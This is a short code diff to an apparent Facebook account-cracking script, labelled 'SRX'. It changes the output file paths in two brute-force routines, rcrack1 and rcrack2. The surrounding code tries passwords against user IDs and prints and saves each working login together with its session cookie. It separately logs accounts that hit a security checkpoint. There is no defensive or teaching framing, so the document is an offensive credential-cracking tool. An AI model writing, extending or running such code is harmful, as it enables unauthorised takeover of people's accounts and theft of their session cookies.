@@ -595,14 +595,14 @@ def rcrack1(uid,pwx,tl):
                 else:
                     print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
                     print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
-                    open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
+                    open('SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                     oks.append(uid)
                     break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = uid
                 #print(f"\r{R}   [SRX-CP] {cid}|{ps}")
-                open('/sdcard/SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
+                open('SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -659,14 +659,14 @@ def rcrack2(uid,pwx,tl):
                 cid = coki.split('c_user=')[1].split(';')[0]
                 print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
                 print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
-                open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
+                open('SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 #print(f"\r{R}   [SRX-CP] {cid}|{ps}")
-                open('/sdcard/SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
+                open('SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
                 cps.append(uid)
                 break
             else:
